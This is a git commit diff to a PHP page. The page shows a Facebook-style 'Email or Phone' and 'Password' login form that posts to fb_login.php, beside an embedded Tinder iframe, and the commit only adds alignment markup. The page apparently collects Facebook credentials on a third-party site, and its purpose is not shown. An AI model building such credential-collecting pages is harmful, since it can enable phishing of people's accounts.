ad73c77925ed5e1c73670c2852c713f88d2f8390
hrib <hugo.dose@gmail.com>
2016-07-08 13:35:25 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,13 +1,13 @@
 <?php
 
 unlink('mirazmac_cookie.txt');
-
+      echo '<div align="right">';
       echo '<form action="fb_login.php" method="post">';
       echo '<font style="font-family:arial; font-size:9px;">Email or Phone</font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 200px; margin-left: 10px; margin-top: 10px;">';
       echo '<font style="font-family:arial; font-size:9px;">  Password</font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 200px; margin-left: 10px; margin-top: 10px;">';
       echo '<input type="submit" value="Log In" style="font-family:arial; font-size:9px; margin-left: 10px; margin-top: 10px;">';
       echo '</form>'; 
-      
+      echo '</div>';
 ?>
 
 <iframe src="https://www.gotinder.com/"></iframe> 
